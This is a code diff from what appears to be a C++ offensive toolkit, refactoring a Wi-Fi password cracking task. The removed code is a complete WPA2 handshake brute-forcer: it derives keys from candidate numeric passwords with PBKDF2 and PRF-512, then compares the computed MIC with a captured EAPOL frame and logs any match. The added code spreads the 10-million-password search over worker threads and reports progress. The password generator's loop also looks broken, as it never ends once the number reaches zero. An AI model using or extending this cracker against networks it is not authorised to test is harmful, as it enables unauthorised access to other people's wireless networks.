@@ -17,72 +17,14 @@ std::string ashk::tasks::WifiPasswordCrackingTask::get_data(ashk::tasks_data_id 
 }
 
 
-#define SHA1_DIGEST_LENGTH 20
-
-void prf_512(const unsigned char* key, int key_len,
-             const std::string& label,
-             const unsigned char* data, int data_len,
-             unsigned char* output, int output_len = 64) {
-
-    unsigned int md_len;
-    unsigned char digest[SHA1_DIGEST_LENGTH];
-    int iterations = (output_len + SHA1_DIGEST_LENGTH - 1) / SHA1_DIGEST_LENGTH;
-
-    int pos = 0;
-    for (int i = 0; i < iterations; ++i) {
-        std::vector<unsigned char> input;
-        input.insert(input.end(), label.begin(), label.end());
-        input.push_back(0x00);  // null byte separator
-        input.insert(input.end(), data, data + data_len);
-        input.push_back(static_cast<unsigned char>(i));
-
-        HMAC(EVP_sha1(), key, key_len, input.data(), input.size(), digest, &md_len);
-
-        int copy_len = std::min(output_len - pos, SHA1_DIGEST_LENGTH);
-        memcpy(output + pos, digest, copy_len);
-        pos += copy_len;
-    }
-}
 
 
-std::string num_to_pass(int n) {
-    static const char chars[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
-    int num=10;
-
-    std::string out;
-    while(n>=0){
-        out+=chars[n%num];
-        n=n/num;
-    }
-    return out;
-}
-
-void procesThread(int start,int end,auto handshake_data,auto seed,auto epol_ofset){
-
-    uint8_t pmk[32];
-    uint8_t mic[20];
-    uint8_t ptk[64];
-    for(int i=start;i<end;i++) {
-        std::string password= num_to_pass(i);
-        std::cout<<i<<" "<<password<<std::endl;
-        PKCS5_PBKDF2_HMAC_SHA1(password.c_str(), 8,
-                               (uint8_t *) handshake_data->selected_ap->e_ssid.c_str(),
-                               handshake_data->selected_ap->e_ssid.length(),
-                               4096, 32, pmk);
 
 
-        prf_512(pmk, 32, "Pairwise key expansion", seed, 6 + 6 + 32 + 32, ptk);
 
-        memset(handshake_data->eapol + epol_ofset, 0, 16); // Zero out MIC
-        HMAC(EVP_sha1(), ptk, 16, handshake_data->eapol, handshake_data->eapol_size, mic, nullptr);
 
-        if (memcmp(mic, handshake_data->MIC, 16) == 0) {
-            std::cout << "PASSWORD: " << password << std::endl;
-            ashk::utils::Logger::getInstance().log("PASSWORD: "+password+"\n");
-            break;
-        }
-    }
-}
+
+
 #include <fstream>
 void ashk::tasks::WifiPasswordCrackingTask::exec() {
     logger.log("start password cracking\n");
@@ -134,21 +76,24 @@ void ashk::tasks::WifiPasswordCrackingTask::exec() {
     uint8_t mic[20];
     uint8_t ptk[64];
 
-    std::vector<std::thread *>threads;
     int total_number_of_passwords=10000000;
-    int number_of_threads= (int)sysconf(_SC_NPROCESSORS_ONLN);
+    int number_of_threads= (int)sysconf(_SC_NPROCESSORS_ONLN)-1;
     int pass_range=total_number_of_passwords/number_of_threads;
+    std::vector<WPA2CrackingThread*> threads;
+
     for (int i=0;i<number_of_threads;i++){
-        threads.push_back(new std::thread([&](){
-            int start=i*pass_range;
-            int end=(i+1)*pass_range;
-            procesThread(start,end,handshake_data,seed,epol_ofset);
-        }));
-
+        threads.push_back(new WPA2CrackingThread(i*pass_range,(i+1)*pass_range,epol_ofset,seed,handshake_data,i));
     }
-
-    for (auto i:threads){
-        i->join();
+    for(auto i:threads){
+        i->start();
+    }
+    while (is_running()) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+        int tested=0;
+        for(auto &i:threads){
+            tested+=i->t;
+        }
+        logger.log(std::to_string((float)tested/total_number_of_passwords)+"%\n");
     }
     ashk::Task::end();
 }
